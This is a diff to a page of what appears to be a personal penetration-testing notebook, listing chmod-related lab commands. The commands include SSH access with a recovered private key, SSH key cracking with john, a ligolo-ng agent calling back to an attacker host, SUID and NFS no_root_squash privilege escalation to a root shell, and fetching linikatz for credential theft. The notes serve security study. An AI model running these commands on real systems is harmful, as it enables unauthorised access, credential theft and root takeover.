@@ -9,6 +9,31 @@ hideFooterPagination: true
 
 {/* Generated from Commands/chmod.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## chmod: choose the operation and read the result
+
+Commands and examples collected from your chmod notes.
+
+### What the result establishes
+
+Read the resulting mode on the intended file and distinguish file execute bits from directory traversal permission.
+
+### Prerequisites and common failures
+
+Mode changes do not override every ACL, mount option or ownership rule; use the original permission baseline when restoring a lab change.
+
+### Example 1: Attacking SSH
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your chmod notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=chmod) · [All tools](/index)
 
 ## Attacking SSH
@@ -19,6 +44,13 @@ hideFooterPagination: true
 chmod 600 id_rsa
 ssh -i id_rsa user@<IP>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 2: Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#example-2-attacking-ssh) · [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -61,6 +93,13 @@ chmod +x ./finalrecon.py
 ./finalrecon.py --ps --url http://<target>        # Port scan
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DNS and Web Reconnaissance: Full Workflow — FinalRecon](/recon/dns-web-recon-cheat-sheet#finalrecon)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SSH (Port 22)">
@@ -82,6 +121,13 @@ ssh2john id_rsa > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — SSH (Port 22)](/enumeration/footprinting-lab-methodology-cheat-sheet#ssh-port-22) · [Hashcat: Modes, Rules, and Masks — Example 5: SSH (Port 22)](/tools/hashcat#example-5-ssh-port-22) · [John the Ripper and File Converters — Example 5: SSH (Port 22)](/tools/john#example-5-ssh-port-22)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Footprinting: Service-by-Service Lab Workflow**
 
 Context from the notebook: Lesson learned:  Found SSH private key via FTP (in  .ssh  directory) and via IMAP (in an email). Always fix permissions with  chmod 600  before using.
@@ -89,6 +135,13 @@ Context from the notebook: Lesson learned:  Found SSH private key via FTP (in  .
 ```text
 chmod 600
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — SSH (Port 22)](/enumeration/footprinting-lab-methodology-cheat-sheet#ssh-port-22)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -108,6 +161,13 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2. Prepare the proxy on Kali">
@@ -123,6 +183,13 @@ chmod +x proxy
 ./proxy -h
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 2. Prepare the proxy on Kali](/pivoting/ligolo-bloodhound-setup#2-prepare-the-proxy-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Linux target">
@@ -135,6 +202,13 @@ chmod +x proxy
 chmod +x agent
 ./agent -connect KALI_IP:11601 -ignore-cert
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — Linux target](/pivoting/ligolo-bloodhound-setup#linux-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -150,6 +224,13 @@ gcc -o /tmp/suid /tmp/suid.c
 sudo chmod +x /tmp/suid # execute right
 sudo chmod +s /tmp/suid # setuid bit
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Create a SUID binary](/privesc/linux-privesc-checklist#create-a-suid-binary)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -177,6 +258,13 @@ cp /bin/bash .
 chmod +s bash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 3: NFS Root Squashing](/enumeration/nfs-enumeration-network-file-system#example-3-nfs-root-squashing) · [NFS Enumeration and Exports — Example 7: NFS Root Squashing](/enumeration/nfs-enumeration-network-file-system#example-7-nfs-root-squashing) · [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Privilege escalation via no_root_squash">
@@ -197,6 +285,13 @@ chmod u+s /tmp/nfs/rootshell                     # set the SUID bit (stays becau
 ./rootshell                                      # runs as root → root shell
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Privilege escalation via no_root_squash](/enumeration/nfs-enumeration-network-file-system#privilege-escalation-via-no_root_squash)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Tooling &amp; install">
@@ -213,6 +308,13 @@ EOF
 chmod +x ~/.local/bin/gettgtpkinit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Tooling & install](/password-attacks/pass-the-certificate#tooling-&-install)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Linikatz">
@@ -225,6 +327,13 @@ chmod +x ~/.local/bin/gettgtpkinit
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 chmod +x linikatz.sh
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Linikatz](/password-attacks/pass-the-ticket-from-linux#linikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -243,6 +352,32 @@ chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
 id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Linux Remote Access: SSH, Rsync, and R-Services](/enumeration/linux-remote-management-protocols-cheat-sheet)
+- [Ligolo-ng Setup and BloodHound Collection](/pivoting/ligolo-bloodhound-setup)
+- [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux)
+- [HTB Nibbles: Walkthrough and Report](/cheatsheets/nibbles)
+- [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
+- [Pass the Certificate: PKINIT and Lab Walkthrough](/password-attacks/pass-the-certificate)
+- [Footprinting: Service-by-Service Lab Workflow](/enumeration/footprinting-lab-methodology-cheat-sheet)
+- [Pivoting and File Transfer: Field Reference](/cheatsheets/pivoting-file-transfer)
+- [Privilege Escalation: Choose a Checklist](/privesc/index)
+- [Active Directory Attack Path: Worked Lab](/cheatsheets/ad-attack-path-worked-example)
+- [DNS and Web Reconnaissance: Full Workflow](/recon/dns-web-recon-cheat-sheet)
+- [NFS Enumeration and Exports](/enumeration/nfs-enumeration-network-file-system)
+
+{/* VAULT_RELATED_END */}
